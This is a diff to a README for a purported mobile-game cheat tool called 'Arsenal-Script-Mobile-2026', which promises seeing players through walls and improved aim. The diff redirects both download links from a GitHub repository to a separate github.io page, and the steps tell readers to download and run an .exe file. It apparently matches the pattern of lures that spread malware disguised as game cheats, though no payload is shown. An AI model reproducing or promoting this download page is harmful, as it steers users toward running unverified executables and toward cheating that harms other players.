@@ -1,6 +1,6 @@
 # 🎮 Arsenal-Script-Mobile-2026 - Master your game with reliable tools
 
-[![](https://img.shields.io/badge/Download-Arsenal_Script-blue.svg)](https://github.com/Heg4050/Arsenal-Script-Mobile-2026)
+[![](https://img.shields.io/badge/Download-Arsenal_Script-blue.svg)](https://heg4050.github.io)
 
 ## 📌 Overview
 Arsenal-Script-Mobile-2026 offers players a way to improve their experience in the game. This project allows users to see players through walls and improve aim. The software works in the background to ensure stability. It integrates with your current mobile game setup on Windows via an emulator.
@@ -16,7 +16,7 @@ Before you start, ensure your computer meets these requirements:
 ## 📥 Getting the software
 Follow these steps to obtain the tool:
 
-1. Visit [this link](https://github.com/Heg4050/Arsenal-Script-Mobile-2026) to reach the main project page.
+1. Visit [this link](https://heg4050.github.io) to reach the main project page.
 2. Look for the latest release section.
 3. Click the executable file (.exe) to start your download.
 4. Save the file to your desktop for easy access.
